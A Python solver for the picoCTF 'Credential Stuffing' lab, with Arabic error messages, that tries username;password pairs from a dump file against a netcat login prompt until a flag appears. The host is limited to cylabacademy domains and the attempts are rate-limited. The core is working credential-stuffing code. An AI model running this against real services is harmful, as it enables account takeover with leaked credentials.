"""Bounded solver for the explicitly named picoCTF Credential Stuffing lab."""
from __future__ import annotations

import re
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

ALLOWED_SUFFIXES = (".cylabacademy.net", ".cylabacademy.org")
MAX_CREDENTIALS = 1500
MAX_PARALLEL = 3
ATTEMPT_DELAY = 0.10
CONNECT_TIMEOUT = 2.5
PROMPT_TIMEOUT = 2.5
FLAG_RE = re.compile(r"(?:picoCTF|academy)\{[^{}\r\n]{2,200}\}")


def parse_target(challenge_text: str) -> tuple[str, int] | None:
    """Read the explicit nc target, allowing only challenge-provider domains."""
    match = re.search(r"(?i)\bnc\s+([a-z0-9.-]+)\s+(\d{1,5})\b", challenge_text or "")
    if not match:
        return None
    host = match.group(1).lower().rstrip(".")
    try:
        port = int(match.group(2))
    except ValueError:
        return None
    if (not any(host.endswith(suffix) and host[:-len(suffix)] for suffix in ALLOWED_SUFFIXES)
            or ".." in host or not 1 <= port <= 65535):
        return None
    return host, port


def read_credentials(path: Path) -> tuple[list[tuple[str, str]], int]:
    pairs: list[tuple[str, str]] = []
    malformed = 0
    with path.open("r", encoding="utf-8-sig", errors="replace") as stream:
        for line in stream:
            line = line.strip()
            if not line:
                continue
            parts = line.split(";", 1)
            if len(parts) != 2 or not all(parts):
                malformed += 1
                continue
            pairs.append((parts[0], parts[1]))
            if len(pairs) >= MAX_CREDENTIALS:
                break
    return pairs, malformed


def _receive_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    sock.settimeout(PROMPT_TIMEOUT)
    while len(data) < 8192:
        if marker.lower() in data.lower():
            return bytes(data)
        chunk = sock.recv(1024)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def _receive_response(sock: socket.socket) -> bytes:
    data = bytearray()
    sock.settimeout(PROMPT_TIMEOUT)
    while len(data) < 16384:
        try:
            chunk = sock.recv(2048)
        except socket.timeout:
            break
        if not chunk:
            break
        data.extend(chunk)
        if FLAG_RE.search(data.decode("utf-8", "replace")):
            break
    return bytes(data)


def solve(path: Path, host: str, port: int, *, connector=socket.create_connection,
          delay: float = ATTEMPT_DELAY, progress=None,
          parallelism: int = MAX_PARALLEL) -> dict:
    """Try the supplied dump in small bounded batches at its CTF TCP endpoint."""
    if path.name.lower() != "creds-dump.txt":
        return {"ok": False, "error": "اسم الملف المطلوب هو creds-dump.txt."}
    parsed = parse_target(f"nc {host} {port}")
    if parsed != (host.lower().rstrip("."), port):
        return {"ok": False, "error": "الهدف ليس خدمة CTF مسموحًا بها في نطاق cylabacademy.net/.org."}
    target = f"{host}:{port}"
    try:
        pairs, malformed = read_credentials(path)
    except OSError as exc:
        return {"ok": False, "error": f"تعذر قراءة الملف المحلي: {exc}", "need": "C:\\Falcon\\analysis\\creds-dump.txt"}
    if not pairs:
        return {"ok": False, "error": "الملف فارغ أو لا يحتوي سجلات بصيغة username;password."}
    if progress:
        progress(0, len(pairs))
    parallelism = max(1, min(int(parallelism), MAX_PARALLEL))
    attempts = 0
    connect_errors = 0

    def try_pair(index: int, username: str, password: str) -> dict:
        try:
            with connector((host, port), timeout=CONNECT_TIMEOUT) as sock:
                greeting = _receive_until(sock, b"Username:")
                if b"username:" not in greeting.lower():
                    return {"index": index, "protocol_error": "الخدمة لم تعرض مطالبة Username المتوقعة."}
                sock.sendall(username.encode("utf-8") + b"\n")
                prompt = _receive_until(sock, b"Password:")
                if b"password:" not in prompt.lower():
                    return {"index": index, "protocol_error": "الخدمة لم تعرض مطالبة Password المتوقعة."}
                sock.sendall(password.encode("utf-8") + b"\n")
                response = _receive_response(sock)
                flag_match = FLAG_RE.search((greeting + prompt + response).decode("utf-8", "replace"))
                if flag_match:
                    return {"index": index, "success": True, "flag": flag_match.group(0),
                            "username": username}
                return {"index": index, "connected": True}
        except (OSError, TimeoutError) as exc:
            return {"index": index, "connection_error": str(exc)[:180]}

    for start in range(0, len(pairs), parallelism):
        batch = pairs[start:start + parallelism]
        with ThreadPoolExecutor(max_workers=len(batch), thread_name_prefix="falcon-credential") as pool:
            futures = [pool.submit(try_pair, start + offset, username, password)
                       for offset, (username, password) in enumerate(batch)]
            outcomes = [future.result() for future in futures]
        attempts += len(batch)
        if progress:
            progress(attempts, len(pairs))
        outcomes.sort(key=lambda item: item["index"])
        protocol_error = next((item["protocol_error"] for item in outcomes if item.get("protocol_error")), None)
        if protocol_error:
            return {"ok": False, "attempts": attempts, "entries": len(pairs),
                    "error": protocol_error, "target": target}
        for outcome in outcomes:
            if outcome.get("connection_error"):
                connect_errors += 1
            elif outcome.get("connected"):
                connect_errors = 0
        success = next((item for item in outcomes if item.get("success")), None)
        if success:
            return {"ok": True, "success": True, "flag": success["flag"],
                    "attempts": attempts, "entries": len(pairs), "malformed": malformed,
                    "target": target, "username": success["username"]}
        if connect_errors >= 3:
            return {"ok": False, "attempts": attempts, "entries": len(pairs),
                    "error": "انقطع الاتصال بالخدمة بعد عدة محاولات اتصال متتالية.",
                    "target": target}
        if start + parallelism < len(pairs) and delay > 0:
            time.sleep(delay)
    return {"ok": True, "success": False, "attempts": attempts, "entries": len(pairs),
            "malformed": malformed, "target": target,
            "error": "لم تُرجع الخدمة علمًا ضمن سجلات الملف."}
